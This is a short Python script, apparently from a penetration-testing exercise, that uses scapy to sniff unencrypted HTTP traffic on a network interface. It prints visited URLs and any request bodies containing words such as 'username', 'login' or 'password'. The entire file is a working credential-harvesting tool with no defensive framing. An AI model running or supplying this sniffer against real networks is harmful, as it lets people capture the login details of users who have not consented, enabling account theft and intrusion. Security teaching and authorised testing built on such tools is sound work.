#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import sys

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")

def get_url(packet):
    try:
        return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    except AttributeError:
        return None

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print("\n[+] HTTP Request (URL)>> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

if __name__ == "__main__":
    interface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    sniff(interface)